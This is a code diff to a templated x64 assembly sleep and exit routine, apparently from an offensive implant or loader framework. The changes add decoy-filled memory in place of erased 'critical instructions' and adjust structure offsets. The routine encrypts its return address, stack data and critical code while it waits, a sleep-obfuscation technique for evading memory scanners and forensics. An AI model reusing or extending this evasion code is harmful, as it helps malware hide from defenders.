@@ -9,17 +9,19 @@
 //   [rbp + 0*8]  Method                                   [rbp + 0*8]  Method
 //   [rbp + 1*8]  VirtualProtect                           [rbp + 1*8]  VirtualFree
 //   [rbp + 2*8]  WaitForSingleObject                      [rbp + 2*8]  ExitThread
-//   [rbp + 3*8]  CriticalAddress                          [rbp + 3*8]  Address
-//   [rbp + 4*8]  CriticalSize                             [rbp + 4*8]  Size
-//   [rbp + 5*8]  ShelterAddress
-//   [rbp + 6*8]  TimerHandle
-//   [rbp + 7*8]  CryptoKey
+//   [rbp + 3*8]  CriticalAddress                          [rbp + 3*8]  CriticalAddress
+//   [rbp + 4*8]  CriticalSize                             [rbp + 4*8]  CriticalSize
+//   [rbp + 5*8]  DecoyAddress                             [rbp + 5*8]  DecoyAddress
+//   [rbp + 6*8]  DecoySize                                [rbp + 6*8]  DecoySize
+//   [rbp + 7*8]  ShelterAddress
+//   [rbp + 8*8]  TimerHandle
+//   [rbp + 9*8]  CryptoKey
 
 // step:
 //   encrypt return address                                erase return address
-//   encrypt critical instructions to shelter              erase critical memory
+//   encrypt critical instructions to shelter              fill critical memory with decoy
 //   adjust the critical memory page protect               free critical memory page
-//   erase the critical instructions                       exit thread
+//   fill critical memory with decoy                       exit thread
 //   encrypt stack about structure
 //   call WaitForSingleObject
 //   decrypt stack about structure
@@ -50,7 +52,7 @@ method_sleep:
 
   // save fields to non-volatile registers
   mov {{.RegN.rbp}}, rcx                       {{iji}} // save structure pointer
-  mov {{.RegN.rbx}}, [{{.RegN.rbp}} + 7*8]     {{iji}} // save crypto key
+  mov {{.RegN.rbx}}, [{{.RegN.rbp}} + 9*8]     {{iji}} // save crypto key
 
   // prevent the fixed crypto key
   xor {{.RegN.rbx}}, {{.RegV.rax}}             {{iji}}
@@ -62,7 +64,7 @@ method_sleep:
 
   // destroy CryptoKey in the stack
   xor {{.RegV.rdx}}, {{.RegV.rdx}}             {{iji}}
-  mov [{{.RegN.rbp}} + 7*8], {{.RegV.rdx}}     {{iji}}
+  mov [{{.RegN.rbp}} + 9*8], {{.RegV.rdx}}     {{iji}}
 
   // encrypt return address
   mov {{.RegV.rcx}}, [rsp + 3*8]               {{iji}}
@@ -72,7 +74,7 @@ method_sleep:
   // encrypt the critical memory to shelter
   mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 3*8]     {{iji}} // set critical address
   mov {{.RegV.rdx}}, [{{.RegN.rbp}} + 4*8]     {{iji}} // set critical size
-  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 5*8]     {{iji}} // set shelter address
+  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 7*8]     {{iji}} // set shelter address
   call xor_buf                                 {{iji}}
 
   // encrypt address of WaitForSingleObject
@@ -165,7 +167,7 @@ method_free:
   sub rsp, 0x20                                {{iji}} // reserve stack for call convention
   call rax                                     {{iji}} // call ExitThread
   add rsp, 0x20                                {{iji}} // restore stack for call convention
-  int3                                         {{iji}} // unreachable
+  ret                                          {{iji}} // unreachable
 
 xor_buf:
   shr {{.RegV.rdx}}, 3                         {{iji}} // calculate the loop count
